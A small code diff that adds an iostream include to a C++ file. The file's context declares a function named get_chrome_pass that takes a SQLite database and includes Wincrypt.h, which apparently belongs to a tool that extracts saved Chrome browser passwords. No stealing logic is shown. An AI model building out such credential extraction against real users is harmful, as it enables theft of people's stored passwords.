@@ -5,6 +5,7 @@
 #include <Wincrypt.h>
 #include <tchar.h>
 #include <sstream>
+#include <iostream>
 #include "../sqlite3.h"
 
 std::stringstream get_chrome_pass(sqlite3* db);
